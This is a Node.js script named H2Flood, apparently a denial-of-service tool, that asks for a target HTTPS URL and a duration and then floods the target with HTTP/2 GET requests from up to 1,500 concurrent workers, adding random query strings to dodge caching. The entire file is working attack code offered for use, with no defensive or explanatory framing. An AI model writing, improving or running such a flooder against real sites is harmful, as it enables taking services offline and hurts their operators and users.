const http2 = require('http2-wrapper');
const os = require('os');

const MAX_CONCURRENT = Math.min(os.cpus().length * 150, 1500);
const REQUEST_TIMEOUT = 4000;

class H2Flood {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.running = true;
    }

    async floodRequest() {
        const url = this.target + (this.target.includes('?') ? '&' : '?') + Math.random().toString(36).substring(2, 10);
        try {
            await http2.auto.resolveRequest(url, {
                method: 'GET',
                timeout: REQUEST_TIMEOUT
            });
        } catch {}
    }

    async worker() {
        while (this.running && Date.now() - this.startTime < this.duration) {
            this.floodRequest();
        }
    }

    async run() {
        const tasks = [];
        for (let i = 0; i < MAX_CONCURRENT; i++) {
            tasks.push(this.worker());
        }
        await Promise.all(tasks);
    }
}

(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const inputTarget = await ask("TARGET: ");
    let target = inputTarget.trim();
    if (!target.startsWith('https://')) {
        console.log("HTTP/2 only supports HTTPS targets.");
        process.exit();
    }

    const durationInput = await ask("TIME (seconds): ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time.");
        return;
    }

    const attack = new H2Flood(target, duration);
    await attack.run();
})();
